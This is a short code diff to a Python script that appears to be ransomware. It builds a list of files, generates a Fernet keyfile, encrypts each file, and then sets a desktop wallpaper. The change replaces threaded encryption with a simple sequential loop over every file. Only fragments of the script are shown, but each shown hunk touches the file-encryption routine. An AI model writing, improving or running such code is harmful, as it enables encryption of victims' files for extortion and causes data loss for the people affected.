@@ -19,7 +19,6 @@ import time
 import os
 import ntpath
 import sys
-from threading import Thread
 from cryptography.fernet import Fernet
 
 fileList = []
@@ -129,9 +128,7 @@ GenKeyFile(keyfile)
 #print("Generated keyfile")
 
 for file in fileList:
-    new_thread = Thread(target=EncryptFile, args=(file, keyfile))
-    new_thread.start()
-new_thread.join()
+    EncryptFile(file, keyfile)
 #print("Encrypted files")
 
 SetWallpaper("wallpaper.jpg")
